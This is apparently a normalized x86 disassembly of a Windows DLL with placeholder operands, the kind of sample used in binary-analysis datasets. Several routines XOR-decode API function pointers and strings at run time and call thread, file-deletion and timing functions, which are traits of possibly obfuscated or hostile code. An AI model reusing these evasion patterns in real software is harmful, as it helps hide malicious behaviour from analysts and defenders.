pop esi
mov [ eax ] dx
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
xor edx edx
pop edi
mov [ eax ] dx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
sub_100084f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008357c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov edi edx
xor esi esi
mov [ ebp - 0x14 ] esi
test edi edi
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
jne r-xdata
lea eax [ edx + 0x1 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp eax 0x1
jne r-xdata
push 0x90
call sub_10055606
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
cmp eax 0x2
jne r-xdata
push 0xc8
call sub_10055606
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov ebx [ ebx ]
push edx
push eax
mov ecx edi
call sub_10066470
jmp r-xdata
cmp eax 0x3
jne r-xdata
push 0xb0
call sub_10055606
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov ecx [ ebx ]
push edx
push edi
mov edx eax
call sub_10033f90
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov ecx [ rw-data ]
cmp ecx edx
ja r-xdata
mov esi eax
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x14 ] esi
mov eax [ rw-data ]
lea edx [ ebp - 0x14 ]
cmp edx eax
jae r-xdata
push 0xb8
call sub_10055606
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x3
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov ebx [ ebx ]
push edx
mov ecx edi
call sub_1002a890
jmp r-xdata
test eax eax
je r-xdata
mov eax rw-data
call sub_10020b00
mov eax [ rw-data ]
mov edi edx
sub edi ecx
sar edi 0x2
cmp eax [ rw-data ]
jne r-xdata
mov ecx [ ebx ]
mov edx [ ebp + 0x8 ]
push ecx
mov ecx [ edx ]
push ecx
push edi
push eax
call sub_1004e070
jmp r-xdata
push 0x0
push 0x0
push 0x1
add eax 0x4
push 0x0
mov [ rw-data ] eax
call [ CreateEventW@IAT ]
xor ebx ebx
push ebx
xor edx edx
push ebx
mov [ ebp - 0x24 ] edx
lea edx [ ebp - 0x3c ]
push edx
push sub_10055a50
mov [ ebp - 0x3c ] eax
push ebx
mov eax sub_10025cf0
xor ecx ecx
push ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x34 ] rw-data
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] rw-data
call [ CreateThread@IAT ]
mov [ esi + 0x4c ] eax
mov eax [ ebp - 0x3c ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
mov ecx [ rw-data ]
mov edx [ ebp - 0x3c ]
mov al 0x38
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] al
xor [ ebp + 0x9 ] al
xor [ ebp + 0xa ] al
xor [ ebp + 0xb ] al
push edx
call [ ebp + 0x8 ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ eax ] esi
test eax eax
je r-xdata
mov eax rw-data
call sub_10020b00
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov ecx [ ecx + edi * 4 ]
mov [ eax ] ecx
jmp r-xdata
mov eax [ rw-data ]
sub_10008720
push ebp
mov ebp esp
push ecx
push 0x0
push eax
or eax 0xffffffff
mov [ ebp - 0x4 ] 0x0
call sub_100446e0
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] cx
push eax
mov ecx edi
call sub_10036380
mov eax edi
mov esp ebp
pop ebp
retn
sub_10008757
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_100309b2
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10008780
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
cmp edi 0x7ffffffe
jbe r-xdata
push r--data
call sub_1002c5ed
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_1002c5ed
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
call sub_1004d170
test edi edi
je r-xdata
mov edx [ ebp + 0xc ]
push edx
push edi
push 0x0
mov ecx esi
call sub_10030910
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
xor ecx ecx
pop edi
mov [ eax ] cx
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
xor ecx ecx
mov [ eax ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10008820
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10083916
mov eax [ fs : 0x0 ]
push eax
sub esp 0x318
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x310 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x328 ]
mov [ fs : 0x0 ] eax
mov edi ecx
xor ebx ebx
cmp [ edi + 0x8 ] ebx
jne r-xdata
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x330 ] ebx
lea eax [ esp + 0x34 ]
mov ecx edi
lea esi [ esp + 0x44 ]
mov [ esp + 0x14 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x3c ] ebx
call sub_10060b10
mov [ esp + 0x330 ] 0x1
mov esi [ esp + 0x34 ]
cmp esi ebx
je r-xdata
lea eax [ ebx + 0x1 ]
jmp r-xdata
lea edx [ esp + 0x9c ]
mov eax 0xda
call sub_10013830
cmp [ edi + 0x8 ] ebx
je r-xdata
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x44 ]
push ecx
push edx
push esi
call sub_10015b10
push esi
call sub_1006591f
add esp 0x14
mov ecx [ esp + 0x328 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x310 ]
xor ecx esp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ esp + 0x9c ]
mov eax 0x17
call sub_10013830
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] bl
call sub_100542e0
cmp [ esp + 0x24 ] ebx
je r-xdata
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x20 ]
lea edi [ esp + 0x28 ]
lea esi [ esp + 0x48 ]
call sub_10041440
cmp eax ebx
je r-xdata
mov eax 0x2
jmp r-xdata
mov esi [ esp + 0x24 ]
mov edi [ esp + 0x28 ]
mov eax esi
call sub_10020290
push esi
call sub_1006591f
add esp 0x4
mov eax [ esp + 0x1c ]
cmp eax 0x1e84800
jge r-xdata
lea edx [ esp + 0x18 ]
mov eax 0xb5
call sub_10013830
mov ecx edx
push ecx
mov ecx [ rw-data ]
push edx
mov eax edx
push eax
push 0x1
push 0x1
push ecx
lea eax [ esp + 0x12c ]
mov [ esp + 0x38 ] 0x1
call sub_1002ed80
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ rw-data ]
push ebx
push eax
push ecx
push edx
xor edx edx
xor ecx ecx
call sub_10009050
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x14 ]
push edx
push eax
lea eax [ esp + 0x11c ]
call sub_10031770
add esp 0x8
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
lea edx [ esp + 0x9c ]
mov eax 0x95
call sub_10013830
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] bl
call sub_100542e0
lea esi [ esp + 0x24 ]
call sub_10028360
mov eax 0x3
jmp r-xdata
mov esi [ esp + 0x24 ]
mov edi [ esp + 0x28 ]
cmp esi edi
je r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov esi [ esp + 0x24 ]
mov edi [ esp + 0x28 ]
cmp esi edi
je r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
cmp [ esp + 0x20 ] ebx
je r-xdata
lea esp [ esp ]
lea edx [ esp + 0x9c ]
mov eax 0x142
call sub_10013830
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] bl
call sub_100542e0
mov esi [ esp + 0x24 ]
cmp esi ebx
je r-xdata
mov eax [ esi + 0x1c ]
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
add esi 0x24
cmp esi edi
jne r-xdata
lea edx [ esp + 0x114 ]
push edx
call sub_10018ea0
cmp eax ebx
je r-xdata
lea edx [ esp + 0x9c ]
mov eax 0x95
call sub_10013830
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] bl
call sub_100542e0
mov esi [ esp + 0x24 ]
cmp esi ebx
je r-xdata
mov ecx [ esi + 0x1c ]
push ecx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
add esi 0x24
cmp esi edi
jne r-xdata
xor eax eax
mov eax esi
call sub_10020290
push esi
call sub_1006591f
add esp 0x4
jmp r-xdata
lea ecx [ esp + 0x114 ]
push ecx
call [ DeleteFileW@IAT ]
lea eax [ esp + 0x114 ]
push eax
call [ DeleteFileW@IAT ]
lea edx [ esp + 0x9c ]
mov eax 0x95
call sub_10013830
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] bl
call sub_100542e0
mov esi [ esp + 0x24 ]
cmp esi ebx
je r-xdata
mov eax 0x4
jmp r-xdata
mov eax esi
call sub_10020290
push esi
call sub_1006591f
add esp 0x4
mov eax 0x5
jmp r-xdata
mov eax esi
call sub_10020290
push esi
call sub_1006591f
add esp 0x4
sub_10008ba0
push ebp
mov ebp esp
push 0xffffffff
push sub_10083968
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx 0x1
test [ rw-data ] bl
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
or [ rw-data ] ebx
mov [ ebp - 0x4 ] 0x0
xor eax eax
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] ax
mov esi rw-data
mov [ ebp - 0x4 ] bl
call sub_100513e0
push j_sub_10048db0
call sub_100662c2
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
call sub_1006a590
test eax eax
jne r-xdata
call sub_10037f80
test eax eax
jne r-xdata
mov ecx eax
call sub_1000a6d0
test eax eax
je r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ rw-data ] ebx
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10008c88
mov edi edi
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x48 ] 0x0
and [ ebp - 0x4c ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x48 ]
push edx
lea edx [ ebp - 0x4c ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_100149fd
add esp 0x18
push eax
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_1003650a
fstp [ ebp - 0x44 ]
mov eax [ ebp - 0x4c ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
je r-xdata
fld [ ebp - 0x44 ]
shl eax 0x2
push eax
push ecx
fstp [ esp ]
call sub_10021561
pop ecx
fstp [ ebp - 0x44 ]
pop ecx
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x50 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
fld [ ebp - 0x44 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x20
sub_10008d48
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1001124e
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_10008df0
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push ebx
mov ebx ecx
mov ecx [ ebx + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
push esi
mov esi ecx
mov cl 0x1
push edi
mov [ ebp - 0x4 ] cl
jne r-xdata
mov edi esi
mov [ ebp + 0x10 ] edi
test cl cl
je r-xdata
mov edi [ edx + 0xc ]
mov eax [ edi + 0xc ]
push edx
cmp eax [ edx + 0xc ]
jae r-xdata
mov eax [ ebx + 0x4 ]
lea ecx [ ebp + 0x10 ]
cmp esi [ eax ]
jne r-xdata
cmp edi [ eax + 0xc ]
setb cl
cmp [ eax + 0xc ] edi
setae cl
jmp r-xdata
call sub_1006591f
mov eax [ ebp + 0x8 ]
add esp 0x4
mov [ eax ] edi
pop edi
pop esi
mov [ eax + 0x4 ] 0x0
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp - 0x4 ]
push esi
push ecx
lea edx [ ebp + 0x10 ]
push edx
mov ecx ebx
call sub_10008200
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
call sub_1003d870
mov edi [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push edx
push esi
push 0x1
push ecx
mov ecx ebx
call sub_10008200
mov edx [ eax ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ eax ] edx
mov [ eax + 0x4 ] 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
mov [ ebp - 0x4 ] cl
test cl cl
je r-xdata
cmp [ ebp + 0x10 ] 0x0
mov esi eax
je r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_10008ec1
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_10037958
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10010183
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100612be
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x1c
sub_10008f40
push ebp
mov ebp esp
sub esp 0x14
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
push ebx
push esi
xor eax eax
mov bl 0x38
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push eax
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
xor [ ebp - 0x4 ] bl
xor [ ebp - 0x3 ] bl
xor [ ebp - 0x2 ] bl
xor [ ebp - 0x1 ] bl
push eax
lea edx [ ebp - 0x14 ]
push edx
push ecx
push eax
push eax
mov [ ebp - 0x14 ] 0xd
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
call [ ebp - 0x4 ]
mov edx [ rw-data ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov esi eax
push 0xffffffff
push esi
call [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edx [ ebp - 0x10 ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push edx
call [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10009000
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + r--data ]
xor cl cl
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] 0x0
retn
push esi
xor esi esi
mov edx [ eax ]
mov dl [ edx + esi ]
xor dl [ eax + 0x8 ]
xor dl cl
inc cl
mov [ esi + edi ] dl
movzx esi cl
cmp esi [ eax + 0x4 ]
jb r-xdata
mov eax [ eax + 0x4 ]
mov [ edi + eax ] 0x0
pop esi
retn
sub_10009050
push ebp
mov ebp esp
push 0xffffffff
push sub_100833eb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1d4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0xb4 ] 0x10
mov eax [ ebp + 0xc ]
mov edi [ ebx + 0xb0 ]
lea esi [ ebx + 0xa0 ]
mov [ ebp - 0x1d4 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x1dc ] eax
mov [ ebp - 0x1a4 ] ebx
mov [ ebp - 0x1a0 ] ecx
mov [ ebp - 0x1c0 ] edx
mov [ ebp - 0x1d8 ] esi
mov eax edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
sete al
test al al
je r-xdata
test edi edi
setne al
test eax eax
push 0x0
push r--data
push eax
call sub_10050b90
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax 0x44
jmp r-xdata
mov eax [ ebp - 0x1a0 ]
test eax eax
sete [ ebp - 0x1a9 ]
test eax eax
jne r-xdata
mov eax 0x45
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x10
lea edx [ ebp - 0x6c ]
mov eax 0x2a
mov [ ebp - 0x1b0 ] 0x0
call sub_10060ac0
xor edi edi
xor edx edx
lea eax [ ebp - 0x6c ]
mov [ ebp - 0x148 ] dx
mov [ ebp - 0x134 ] 0x7
mov [ ebp - 0x138 ] edi
lea edx [ eax + 0x2 ]
lea ecx [ ecx ]
lea ecx [ ebp - 0x1a0 ]
push ecx
call sub_1003b1ca
add esp 0x4
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x6c ]
push eax
lea ecx [ ebp - 0x148 ]
call sub_100531b0
lea ecx [ ebp - 0x148 ]
push ecx
mov [ ebp - 0x4 ] edi
mov edx [ ebp - 0x1a0 ]
push edx
mov edx [ ebp - 0x1c0 ]
push ebx
xor ecx ecx
call sub_10010280
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x134 ] 0x8
jb r-xdata
mov [ ebp - 0x1b4 ] edi
mov [ ebp - 0x1a8 ] edi
mov edi ebx
call sub_100010b0
mov [ ebp - 0x1b8 ] eax
test eax eax
je r-xdata
mov eax [ ebp - 0x148 ]
push eax
call sub_1006591f
add esp 0x4
lea edx [ ebp - 0xb8 ]
mov eax 0x1b
call sub_10060ac0
push edx
lea ecx [ ebp - 0x12c ]
call sub_10012920
mov edx [ ebp - 0x1c0 ]
lea eax [ ebp - 0x12c ]
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x1a0 ]
push eax
push ecx
mov ecx [ ebp - 0x1b0 ]
push ebx
call sub_10010280
lea ecx [ ebp - 0x12c ]
call sub_10029c40
mov eax 0x43
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x1d4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb8 ]
mov eax 0x49
call sub_10060ac0
push edx
lea ecx [ ebp - 0x12c ]
call sub_10012920
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x1a0 ]
mov edx [ ebp - 0x1a8 ]
lea eax [ ebp - 0x12c ]
push eax
push ecx
mov ecx [ ebp - 0x1b0 ]
push ebx
call sub_10010280
lea ecx [ ebp - 0x12c ]
call sub_10029c40
mov eax 0x1
jmp r-xdata
mov edi [ ebp + 0x10 ]
lea ecx [ ebp - 0x1b4 ]
push ecx
lea ecx [ ebp - 0x1a8 ]
mov ebx eax
call sub_100246d0
test eax eax
jne r-xdata
mov ebx [ ebp - 0x1a4 ]
mov edx [ ebp - 0x1b8 ]
call sub_10066430
mov edx [ ebp - 0x1dc ]
mov ecx [ ebp - 0x1c0 ]
mov ebx [ ebp - 0x1b4 ]
push edx
mov edx [ ebp - 0x1a0 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x1a8 ]
push eax
push ebx
call sub_10066ab0
push esi
lea ecx [ ebp - 0x180 ]
mov edi eax
call sub_1003f7a0
push edi
lea esi [ ebp - 0x164 ]
mov [ ebp - 0x4 ] 0x3
call sub_10019b20
mov ecx esi
push ecx
lea edx [ ebp - 0x180 ]
push edx
lea eax [ ebp - 0x19c ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_1002a990
add esp 0xc
lea edx [ ebp - 0x48 ]
mov eax 0x7
mov [ ebp - 0x4 ] 0x5
call sub_10060ac0
mov ecx [ edi + 0x54 ]
sub ecx [ edi + 0x50 ]
mov eax 0x88888889
imul ecx
add edx ecx
sar edx 0x5
mov ecx edx
xor esi esi
shr ecx 0x1f
add ecx edx
mov [ ebp - 0x1c4 ] esi
je r-xdata
cmp [ ebp - 0x1a9 ] 0x0
je r-xdata
call [ GetTickCount@IAT ]
mov edx [ edi + 0x50 ]
mov ecx [ ebp - 0x1b8 ]
mov [ ebp - 0x1bc ] eax
lea eax [ ebp - 0x19c ]
add edx esi
push eax
call sub_10044d00
mov ebx eax
call [ GetTickCount@IAT ]
sub eax [ ebp - 0x1bc ]
mov [ ebp - 0x1cc ] eax
fild [ ebp - 0x1cc ]
jns r-xdata
test ebx ebx
je r-xdata
mov esi [ ebp - 0x1b8 ]
lea eax [ ebp - 0x180 ]
push eax
lea ecx [ ebp - 0x164 ]
mov edx esi
call sub_1003ce70
cmp eax 0x42
je r-xdata
mov ecx [ ebp - 0x1a4 ]
fnstcw [ ebp - 0x1ba ]
movzx eax [ ebp - 0x1ba ]
fmul [ ecx + 0x114 ]
or eax 0xc00
mov [ ebp - 0x1cc ] eax
fldcw [ ebp - 0x1cc ]
fistp [ ebp - 0x1d0 ]
mov edx [ ebp - 0x1d0 ]
push edx
fldcw [ ebp - 0x1ba ]
call [ Sleep@IAT ]
cmp ebx 0x42
je r-xdata
fadd [ r--data ]
test edi edi
je r-xdata
push ebx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi + 0xd4 ] 0x0
test ebx ebx
je r-xdata
cmp eax 0x43
jne r-xdata
mov eax [ ebp - 0x1b4 ]
mov ecx [ ebp - 0x1b8 ]
mov [ ecx + 0xd4 ] 0x0
test eax eax
je r-xdata
cmp ebx 0x43
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax 0x71
call sub_10060ac0
push edx
lea ecx [ ebp - 0x30 ]
call sub_10012920
mov edx [ ebp - 0x1a4 ]
mov [ ebp - 0x4 ] 0x9
mov ecx [ ebp - 0x1a0 ]
lea eax [ ebp - 0x30 ]
push eax
push ecx
mov ecx [ ebp - 0x1b0 ]
push edx
mov edx [ ebp - 0x1a8 ]
call sub_10010280
lea ecx [ ebp - 0x30 ]
call sub_10029c40
lea ecx [ ebp - 0x19c ]
call sub_10061060
lea ecx [ ebp - 0x164 ]
call sub_10061060
lea ecx [ ebp - 0x180 ]
call sub_10061060
xor eax eax
mov eax edi
call sub_10007480
mov eax edi
call sub_10007480
lea edx [ ebp - 0xe8 ]
mov eax 0x1c
call sub_10060ac0
mov ecx edx
push ecx
lea ecx [ ebp - 0x12c ]
call sub_10012920
mov ecx [ ebp - 0x1a4 ]
lea edx [ ebp - 0x12c ]
mov [ ebp - 0x4 ] 0x8
mov eax [ ebp - 0x1a0 ]
push edx
push eax
push ecx
push ebx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea edx [ ebp - 0x34 ]
mov eax 0x3d
call sub_10060ac0
mov eax edi
call sub_10007480
lea edx [ ebp - 0xd8 ]
mov eax 0x2e
call sub_10060ac0
push edx
lea ecx [ ebp - 0x12c ]
call sub_10012920
mov edx [ ebp - 0x1a4 ]
lea eax [ ebp - 0x12c ]
mov [ ebp - 0x4 ] 0x7
mov ecx [ ebp - 0x1a0 ]
push eax
push ecx
push edx
jmp r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ edi + 0x50 ]
mov ebx [ ebp - 0x1b0 ]
add ebx [ esi + eax + 0x24 ]
lea edx [ ebp - 0x140 ]
mov eax 0x3
mov [ ebp - 0x1b0 ] ebx
call sub_10060ac0
mov ecx edx
push ecx
lea ecx [ ebp - 0x12c ]
call sub_10012920
mov ecx [ ebp - 0x1a4 ]
mov [ ebp - 0x4 ] 0x6
mov eax [ ebp - 0x1a0 ]
lea edx [ ebp - 0x12c ]
push edx
mov edx [ ebp - 0x1a8 ]
push eax
push ecx
mov ecx ebx
call sub_10010280
lea ecx [ ebp - 0x12c ]
mov [ ebp - 0x4 ] 0x5
call sub_10029c40
mov ecx [ edi + 0x54 ]
sub ecx [ edi + 0x50 ]
mov ebx [ ebp - 0x1c4 ]
mov eax 0x88888889
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
inc ebx
add eax edx
add esi 0x3c
mov [ ebp - 0x1c4 ] ebx
cmp ebx eax
jb r-xdata
mov esi [ ebp - 0x1d8 ]
mov edx [ ebp - 0x1a8 ]
mov ecx [ ebp - 0x1b0 ]
call sub_10010280
lea ecx [ ebp - 0x12c ]
call sub_10029c40
